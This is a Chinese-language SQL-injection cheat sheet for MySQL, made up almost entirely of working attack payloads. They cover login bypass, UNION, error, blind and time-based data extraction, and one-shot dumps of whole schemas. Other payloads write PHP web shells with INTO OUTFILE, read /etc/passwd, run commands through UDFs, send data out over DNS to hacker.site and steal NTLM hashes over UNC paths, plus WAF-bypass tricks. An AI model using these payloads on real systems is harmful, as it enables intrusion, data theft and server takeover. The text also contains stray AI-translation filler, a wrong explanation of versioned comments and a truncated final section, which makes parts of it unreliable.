# MySQL 注入

## 摘要

* [MySQL 默认数据库](#mysql-default-databases)
* [MySQL 注释](#mysql-comments)
* [基于 MySQL Union 的注入](#mysql-union-based)
  * [检测列数](#detect-columns-number)
  * [使用 information_schema 提取数据库](#extract-database-with-information_schema)
  * [在不使用 information_schema 的情况下提取列名](#extract-columns-name-without-information_schema)
  * [在不使用列名的情况下提取数据](#extract-data-without-columns-name)
* [基于 MySQL 错误的注入](#mysql-error-based)
  * [基于 MySQL 错误 - 基础](#mysql-error-based---basic)
  * [基于 MySQL 错误 - UpdateXML 函数](#mysql-error-based---updatexml-function)
  * [基于 MySQL 错误 - Extractvalue 函数](#mysql-error-based---extractvalue-function)
* [MySQL 盲注](#mysql-blind)
  * [使用子字符串等效的 MySQL 盲注](#mysql-blind-with-substring-equivalent)
  * [使用条件语句的 MySQL 盲注](#mysql-blind-using-a-conditional-statement)
  * [使用 MAKE_SET 的 MySQL 盲注](#mysql-blind-with-make_set)
  * [使用 LIKE 的 MySQL 盲注](#mysql-blind-with-like)
* [基于 MySQL 时间的注入](#mysql-time-based)
  * [在子查询中使用 SLEEP](#using-sleep-in-a-subselect)
  * [使用条件语句](#using-conditional-statements)
* [MySQL DIOS - 一次性转储](#mysql-dios---dump-in-one-shot)
* [MySQL 当前查询](#mysql-current-queries)
* [读取 MySQL 文件内容](#mysql-read-content-of-a-file)
* [写入 MySQL Shell](#mysql-write-a-shell)
  * [Into outfile 方法](#into-outfile-method)
  * [Into dumpfile 方法](#into-dumpfile-method)
* [执行 MySQL UDF 命令](#mysql-udf-command-execution)
* [MySQL 截断](#mysql-truncation)
* [快速利用 MySQL](#mysql-fast-exploitation)
* [MySQL 带外](#mysql-out-of-band)
  * [DNS 数据泄露](#dns-exfiltration)
  * [UNC 路径 - NTLM 哈希窃取](#unc-path---ntlm-hash-stealing)
* [绕过 MySQL WAF](#mysql-waf-bypass)
  * [information_schema 的替代品](#alternative-to-information-schema)
  * [版本的替代品](#alternative-to-version)
  * [科学计数法](#scientific-notation)
  * [条件注释](#conditional-comments)
  * [宽字节注入](#wide-byte-injection)
* [参考资料](#references)


## MySQL 默认数据库

| 名称               | 描述              |
| ------------------ | ----------------- |
| mysql              | 需要 root 权限    |
| information_schema | 从版本 5 开始可用 |


## MySQL 注释

| 类型                       | 描述                      |
| -------------------------- | ------------------------- |
| `#`                        | 哈希注释                  |
| `/* MYSQL Comment */`      | C 风格注释                |
| `/*! MYSQL Special SQL */` | 特殊 SQL                  |
| `/*!32302 10*/`            | MySQL 版本 3.23.02 的注释 |
| `-- -`                     | SQL 注释                  |
| `;%00`                     | 空字节                    |
| \`                         | Backtick                  |

根据文档内容，以下是对您问题的回答：

**MySQL 注入测试**

**字符串：** 查询语句如 `SELECT * FROM Table WHERE id = 'FUZZ';`

测试数据及其结果如下：

```
'	False
''	True
"	False
""	True
\	False
\\	True
```

**数字：** 查询语句如 `SELECT * FROM Table WHERE id = FUZZ;`

测试数据及其结果如下：

```ps1
AND 1	    True
AND 0	    False
AND true	True
AND false	False
1-false	    如果存在漏洞则返回1
1-true	    如果存在漏洞则返回0
1*56	    如果存在漏洞则返回56
1*56	    如果不存在漏洞则返回1
```

**登录：** 查询语句如 `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`

测试数据及其结果如下：

```ps1
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
'='
'LIKE'
'=0--+
```

**基于 UNION 的 MySQL 注入**

**检测列数**

首先需要知道查询的列数。

**使用 `order by` 或 `group by`**

通过不断递增数字直到得到 False 响应。尽管 GROUP BY 和 ORDER BY 在 SQL 中功能不同，但它们可以以完全相同的方式用于确定查询中的列数。

```sql
1' ORDER BY 1--+	#True
1' ORDER BY 2--+	#True
1' ORDER BY 3--+	#True
1' ORDER BY 4--+	#False - 查询只使用了3列
                        #-1' UNION SELECT 1,2,3--+	True
```

或者

```sql
1' GROUP BY 1--+	#True
1' GROUP BY 2--+	#True
1' GROUP BY 3--+	#True
1' GROUP BY 4--+	#False - 查询只使用了3列
                        #-1' UNION SELECT 1,2,3--+	True
```

**使用 `order by` 或 `group by` 基于错误**

与前述方法类似，如果启用了错误显示，我们可以通过一个请求检查列数。

```sql
1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# Unknown column '4' in 'order clause'
# 这个错误意味着查询使用了3列
#-1' UNION SELECT 1,2,3--+	True
```

或者

```sql
1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# Unknown column '4' in 'group statement'
# 这个错误意味着查询使用了3列
#-1' UNION SELECT 1,2,3--+	True
```

基于文档内容，以下是翻译：

##### 使用 `UNION SELECT` 基于错误的方法

如果启用了错误显示，此方法有效。

```sql
1' UNION SELECT @--+        #使用的SELECT语句列数不同
1' UNION SELECT @,@--+      #使用的SELECT语句列数不同
1' UNION SELECT @,@,@--+    #没有错误意味着查询使用3列
                            #-1' UNION SELECT 1,2,3--+	正确
```

##### 使用 `LIMIT INTO` 基于错误的方法

如果启用了错误显示，此方法有效。

当注入点位于LIMIT子句之后时，它对于查找列数很有用。

```sql
1' LIMIT 1,1 INTO @--+        #使用的SELECT语句列数不同
1' LIMIT 1,1 INTO @,@--+      #使用的SELECT语句列数不同
1' LIMIT 1,1 INTO @,@,@--+    #没有错误意味着查询使用3列
                              #-1' UNION SELECT 1,2,3--+	正确
```

##### 使用 `SELECT * FROM SOME_EXISTING_TABLE` 基于错误的方法

如果你知道要查找的表名且启用了错误显示，此方法有效。

它将返回表中的列数，而不是查询的列数。

```sql
1' AND (SELECT * FROM Users) = 1--+ 	#操作数应包含3列
                                        # 这个错误意味着查询使用3列
                                        #-1' UNION SELECT 1,2,3--+	正确
```

### 使用 information_schema 提取数据库

然后以下代码将提取数据库名称、表名称、列名称。

```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

### 不使用 information_schema 提取列名称

适用于 `MySQL >= 4.1` 的方法。

首先提取列号

```sql
?id=(1)and(SELECT * from db.users)=(1)
-- 操作数应包含4列
```

然后提取列名称。

```sql
?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
--列 'id' 不能为空
```

适用于 `MySQL 5` 的方法

```sql
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
--#1060 - 列名 'id' 重复

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
-- #1060 - 列名 'name' 重复

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
...
```

### 不使用列名称提取数据

在不知道列名称的情况下从第4列提取数据。

```sql
select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
```

查询中的注入示例 `select author_id,title from posts where author_id=[INJECT_HERE]`

```sql
MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

## MYSQL 基于错误的方法

### MYSQL 报错注入

MySQL 版本>= 4.1

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```


### UpdateXML 函数报错注入

```sql
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

短payload:

```sql
' and updatexml(null,concat(0x0a,version()),null)-- -
' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```


### Extractvalue 函数报错注入

要求MySQL >= 5.1

```sql
?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```


### MYSQL 基于错误的注入 - NAME_CONST 函数（仅适用于常量）

要求MySQL >= 5.0

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```


## MYSQL 盲注

### MySQL盲注与子字符串等价

```sql
?id=1 and substring(version(),1,1)=5
?id=1 and right(left(version(),1),1)=5
?id=1 and left(version(),1)=4
?id=1 and ascii(lower(substr(Version(),1,1)))=51
?id=1 and (select mid(version(),1,1)=4)
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```

### 使用二进制查询和REGEXP在MySQL盲注中的ORDER BY子句

此查询基本上根据EXISTS()返回1或0来按一列或多列排序。
为了使EXISTS()函数返回1，REGEXP查询需要匹配，这意味着你可以逐个字符地暴力破解盲值并从未经直接输出的数据库中泄露数据。

```
[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS /conditions]) THEN [ONE column TO ORDER BY] ELSE [ANOTHER column TO ORDER BY] END)); -- -
```

### 使用REGEXP的MySQL盲注SQL二进制查询

有效载荷：

```
' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
```

在以下查询中有效（其中“where”子句是注入点）：

```
SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
```

在所述查询中，它将检查“items”数据库中的“name”列是否存在以“a”开头的物品。如果是这样，它将为每个物品休眠3秒。

### 使用条件语句的MySQL盲注

真：`如果@@version以5开头`：

```sql
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
响应：
HTTP/1.1 500 Internal Server Error
```

假：`如果@@version以4开头`：

```sql
2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
响应：
HTTP/1.1 200 OK
```

### 使用MAKE_SET的MySQL盲注

```sql
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
```

### 使用LIKE的MySQL盲注

['_'](https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) 类似于正则表达式字符'.'，使用它可以加快您的盲注测试速度

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
```

## 基于时间的MySQL

以下SQL代码将延迟MySQL的输出。

* MySQL 4/5：`BENCHMARK()`

  ```sql
  +BENCHMARK(40000000,SHA1(1337))+
  '%2Bbenchmark(3200,SHA1(1))%2B'
  AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
  ```

* MySQL 5：`SLEEP()`

  ```sql
  RLIKE SLEEP([SLEEPTIME])
  OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
  ```

### 在子查询中使用SLEEP

```powershell
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '___')# 
1 and (select sleep(10) from dual where database() like '____')#
1 and (select sleep(10) from dual where database() like '_____')#
1 and (select sleep(10) from dual where database() like 'a____')#
...
1 and (select sleep(10) from dual where database() like 's____')#
1 and (select sleep(10) from dual where database() like 'sa___')#
...
1 and (select sleep(10) from dual where database() like 'sw___')#
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where database() like 'swb__')#
1 and (select sleep(10) from dual where database() like 'swi__')#
...
1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
```

### 使用条件语句

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

## MYSQL DIOS - 一次性转储

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#

(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#

-- SecurityIdiots
make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

-- Profexer
(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)

-- Dr.Z3r0
(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))

-- M@dBl00d
(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))

-- Zen
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

-- Zen WAF
(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)

-- ~tr0jAn WAF
+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+

-- ~tr0jAn Benchmark
+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+

-- N1Z4M WAF
+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+

-- sharik
(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
```

## MySQL 当前查询

此表可以列出数据库当前正在执行的所有操作。

```sql
union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #

-- 一次性转储表内容的示例。
union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## MySQL 读取文件内容

需要 `filepriv`，否则会出现错误：`ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
```

```sql
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

如果您是数据库上的 `root` 用户，可以使用以下查询重新启用 `LOAD_FILE`

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MySQL 写入 shell

### 输出到文件方法

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### 输出到转储文件方法

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

## MySQL 截断

在 MySQL 中，“`admin `”和“`admin`”是相同的。如果数据库中的用户名字段有字符限制，其余的字符将被截断。因此，如果数据库的列限制为20个字符，我们输入一个包含21个字符的字符串，最后一个字符将被移除。

```sql
`username` varchar(20) not null
```

有效载荷：`username = "admin               a"`

## MySQL 快速利用

要求：`MySQL >= 5.7.22`

使用 `json_arrayagg()` 而不是 `group_concat()`，它允许显示更少的符号

* group_concat() = 1024符号
* json_arrayagg() > 16,000,000符号

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

## MySQL UDF 命令执行

首先，您需要检查服务器上是否安装了 UDF。

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

然后，您可以使用 `sys_exec` 和 `sys_eval` 等函数。

```sql
$ mysql -u root -p mysql
输入密码: [...]
mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

## MySQL 带外

```powershell
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
```

### DNS 数据泄露

```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC 路径 - NTLM 哈希窃取

```sql
select load_file('\\\\error\\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\\\error\\abc';
select 'osanda' into outfile '\\\\error\\abc';
load data infile '\\\\error\\abc' into table database.table_name;
```

## MySQL WAF 绕过

### information_schema 的替代方案

`information_schema.tables` 的替代方案

```sql
select * from mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> show tables in dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

### 版本的替代方案

```sql
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
```

### 科学计数法

在 MySQL 中，e 表示法用于以科学计数法表示数字。这是一种简洁的格式来表示非常大或非常小的数字。e 表示法由一个数字后跟字母 e 和一个指数组成。
格式为：`基数 'e' 指数`。

例如：

* `1e3` 代表 `1 x 10^3` 即 `1000`。
* `1.5e3` 代表 `1.5 x 10^3` 即 `1500`。
* `2e-3` 代表 `2 x 10^-3` 即 `0.002`。

以下查询是等效的：

* `SELECT table_name FROM information_schema 1.e.tables` 
* `SELECT table_name FROM information_schema .tables` 

同样，常见的绕过身份验证的有效载荷 `' or ''='` 等效于 `' or 1.e('')='` 以及 `1' or 1.e(1) or '1'='1`。
这种技术可以用来混淆查询以绕过 WAF，例如：`1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2` 

### 条件注释

* `/*! ... */`：这是一个条件 MySQL 注释。只有当 MySQL 版本大于或等于紧跟在 `/*!` 后面的数字时，注释内的代码才会被执行。如果 MySQL 版本小于指定数字，注释内的代码将被忽略。
  * `/*!12345UNION*/`：这意味着如果 MySQL 版本是 12.345 或更高，单词 UNION 将作为 SQL 语句的一部分被执行。
  * `/*!31337SELECT*/`：类似地，如果 MySQL 版本是 31.337 或更高，单词 SELECT 将被执行。
    例如：`/*!12345UNION*/`，`/*!31337SELECT*/`

### 宽字节注入

宽字节注入是一种特定类型的 SQL 注入攻击，针对使用多字节字符集（如 GBK 或 SJIS）的应用程序。"宽字节"一词指的是可以用多个字节表示的字符编码。当应用程序和数据库对多字节序列的解释不同时，这种类型的注入尤为相关。

`SET NAMES gbk` 查询可以在基于字符集的 SQL 注入攻击中被利用。当字符集设置为 GBK 时，某些多字节字符可以用来绕过转义机制并注入恶意 SQL 代码。

可以利用几个字符来触发注入。

